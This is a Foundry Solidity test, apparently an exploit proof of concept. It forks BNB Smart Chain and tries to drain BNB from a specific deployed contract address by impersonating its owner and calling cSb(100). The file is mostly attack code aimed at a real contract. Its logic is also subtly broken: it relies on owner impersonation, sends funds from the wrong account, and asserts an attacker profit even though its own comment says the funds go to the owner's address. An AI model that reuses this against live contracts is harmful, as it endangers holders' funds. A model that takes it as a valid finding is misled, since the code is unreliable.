// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the functions we need
interface MetaApesBSC {
    function owner() external view returns (address);
    function cSb(uint256 aP) external;
    function balanceOf(address account) external view returns (uint256);
    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);
    address owner; // Declare owner as a state variable


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for fork test
        vm.createSelectFork(vm.rpcUrl('bsc'));

        // Label addresses for clarity
        vm.label(TARGET, 'MetaApesBSC');
        vm.label(attacker, 'Attacker');

        // Get the owner address from the contract
        owner = MetaApesBSC(TARGET).owner(); // Assign to state variable
        vm.label(owner, 'Contract Owner');

        // Check contract's initial BNB balance
        uint256 initialContractBalance = TARGET.balance;
        console.log('Initial contract BNB balance:', initialContractBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Store initial attacker balance
        uint256 initialAttackerBalance = attacker.balance;
        console.log('Initial attacker balance:', initialAttackerBalance);

        // Impersonate the owner (authorized address)
        vm.startPrank(owner);

        // First, let's send some BNB to the contract so it has something to drain
        // We'll transfer 10 BNB from attacker to contract
        // But we need BNB first - use deal() to give attacker BNB
        deal(attacker, 10 ether);

        // Transfer 10 BNB to contract
        (bool success, ) = TARGET.call{value: 10 ether}('');
        require(success, 'Failed to send BNB to contract');

        console.log('Contract balance after sending BNB:', TARGET.balance);

        // Now drain all BNB using cSb(100)
        // This sends 100% of contract BNB to tfU address
        // tfU is initially set to owner (msg.sender in constructor), which we're impersonating
        MetaApesBSC(TARGET).cSb(100);

        vm.stopPrank();

        // Check final balances
        uint256 finalContractBalance = TARGET.balance;
        uint256 finalAttackerBalance = attacker.balance;

        console.log('Final contract balance:', finalContractBalance);
        console.log('Final attacker balance:', finalAttackerBalance);
        console.log('Profit:', finalAttackerBalance - initialAttackerBalance);

        // Verify exploit succeeded - attacker balance should increase
        assertGt(finalAttackerBalance, initialAttackerBalance, 'Attacker balance did not increase');
        assertEq(finalContractBalance, 0, 'Contract should have 0 BNB left');
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
